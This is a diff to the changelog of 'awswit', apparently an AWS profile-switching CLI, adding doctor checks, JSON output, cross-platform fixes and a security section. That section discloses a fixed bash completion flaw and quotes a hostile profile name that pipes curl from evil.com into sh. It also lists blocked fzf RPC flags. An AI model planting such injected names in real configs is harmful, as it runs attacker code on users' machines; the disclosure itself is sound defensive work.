@@ -21,9 +21,19 @@ _Released on 2026-05-13_
   `$AWS_PROFILE` points at a profile that's not defined in
   `~/.aws/config`, so CI/precmd guards get an actionable signal.
 - New subcommand `awswit doctor` audits `~/.aws/config` and the SSO
-  cache for missing `source_profile` chains, expired or absent SSO
-  tokens, malformed `mfa_serial`, and role profiles without any
-  credential source. Exits non-zero on errors.
+  cache and reports:
+    - missing `source_profile` chains;
+    - **source_profile cycles** (a → b → a — would deadlock the SDK);
+    - expired or absent SSO tokens (with the `aws sso login` command
+      to fix it);
+    - malformed `mfa_serial`;
+    - **region-format typos** (`us-east-1a` is an AZ, not a region;
+      `useast1`, `eu-west` are flagged);
+    - role profiles without any credential source;
+    - **shell-unsafe profile names** that other tools wrote (an
+      unrendered template variable or hostile section header).
+  Exits non-zero on errors. `--json` emits the findings as a JSON
+  array for CI consumption.
 - New subcommand `awswit prompt --format … --default …` prints the
   current profile (or a fallback) for shell-prompt embedding. Both
   `{}` and `%s` work as the placeholder.
@@ -42,6 +52,9 @@ _Released on 2026-05-13_
 - "Did you mean …?" suggestions on `ProfileNotFound`, ranked by
   Levenshtein distance and filtered to candidates that plausibly
   match the typo.
+- `awswit -l --json` now includes `favorite`, `use_count`, and
+  `last_used` per profile so dashboards / scripts can reproduce the
+  picker's frecency-aware ordering.
 
 ### Bug fixes
 
@@ -83,6 +96,39 @@ _Released on 2026-05-13_
 - `picker.run()` no longer flattens `io::Error` into a `ShellError`
   string — `PermissionDenied` on `/dev/tty` etc. now surface with
   their kind preserved.
+
+### Security
+
+- **Critical: bash tab-completion no longer executes `$(…)` embedded
+  in hostile profile names.** A teammate's IaC tool or another
+  process that writes to `~/.aws/config` could put
+  `[profile $(curl evil.com|sh)]` and have it run on every TAB.
+  Two layers fixed it: `fast_profile_names` now filters out any
+  name containing characters outside `[A-Za-z0-9._/@+=-]`, and the
+  bash completer quotes each candidate via `printf %q` before
+  feeding it to `compgen -W`. zsh/fish/powershell completers were
+  not vulnerable; the bash hardening is defense in depth.
+- `BLOCKED_FZF_OPTIONS` now blocks fzf 0.41+ RPC flags
+  (`--listen`, `--listen-unsafe`, `--with-shell`) alongside the
+  existing `--preview` / `--bind` / `--execute` family.
+
+### Cross-platform
+
+- `awswit` data dir on Windows is now `%LOCALAPPDATA%\awswit\`
+  instead of the Unix-style `~/.local/share/awswit/` fallback.
+- PowerShell completer matches via
+  `StartsWith(StringComparison::OrdinalIgnoreCase)` instead of
+  `-like`, so profile names containing PowerShell wildcard
+  characters (`*`, `?`, `[`, `]`) match literally. Captured
+  names are CRLF-trimmed too.
+- TUI alt-screen + mouse-capture now wrapped in an RAII guard
+  alongside raw-mode, so a panic in ratatui can't leave Windows
+  Terminal / conhost eating selection clicks.
+- `AWS_CONFIG_FILE=~/.aws/config` now works for the SSO-cache
+  auto-detect (the `~` is expanded before deriving the parent).
+- Pre-built binaries: added `aarch64-pc-windows-msvc` (Windows on
+  ARM) and `x86_64-unknown-linux-musl` (Alpine / scratch
+  containers) to the cargo-dist target set.
 
 ### Doctor / messages
 
